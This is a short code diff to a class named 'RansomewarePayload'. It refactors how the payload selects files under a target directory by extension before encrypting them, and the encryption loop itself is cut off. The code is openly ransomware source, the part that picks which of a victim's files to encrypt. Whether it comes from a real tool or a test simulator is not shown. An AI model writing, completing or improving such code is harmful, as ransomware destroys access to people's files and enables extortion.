@@ -24,8 +24,10 @@ class RansomewarePayload:
         self._encrypt_files(file_list)
 
     def _find_files(self):
+        file_filters = [file_extension_filter(VALID_FILE_EXTENSIONS_FOR_ENCRYPTION)]
+
         all_files = get_all_files_in_directory(self.target_dir)
-        return filter_files(all_files, file_extension_filter(VALID_FILE_EXTENSIONS_FOR_ENCRYPTION))
+        return filter_files(all_files, file_filters)
 
     def _encrypt_files(self, file_list):
         for file in file_list:
